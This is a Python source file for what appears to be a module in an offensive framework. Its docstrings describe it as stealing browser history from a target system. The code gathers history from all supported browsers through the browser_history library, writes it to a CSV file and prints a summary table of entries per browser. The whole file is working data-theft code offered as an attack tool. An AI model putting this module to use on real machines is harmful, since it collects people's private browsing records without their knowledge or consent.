import browser_history as bh
from core.base_module import BaseModule
from rich.console import Console
from rich.table import Table

class BrowserHistory(BaseModule):
    """Steals browser history from the target system."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'OUTPUT_FILE': ['browser_history.csv', 'The CSV file to save history to.'],
            'TARGET_HOST': ['localhost', 'Note: This module runs locally. This is for metadata.']
        }

    def run(self, options):
        """
        Executes the browser history theft.
        """
        output_file = options.get('OUTPUT_FILE')
        console = Console()

        console.print("[*] Attempting to collect browser history...")

        try:
            # This gets history from all supported browsers
            history = bh.get_history()

            if not history.histories:
                console.print("[*] No browser history found.")
                return

            # Save the history to a CSV file
            history.save(output_file)
            
            console.print(f"[bold green][+] Browser history saved to {output_file}[/bold green]")

            # Display a summary table
            table = Table(title="Browser History Summary", show_header=True, header_style="bold magenta")
            table.add_column("Browser", style="cyan")
            table.add_column("Entries Found", justify="right")

            # The library structure is a bit nested
            for browser, entries in history.browser_history.items():
                table.add_row(browser, str(len(entries)))
            
            console.print(table)

        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")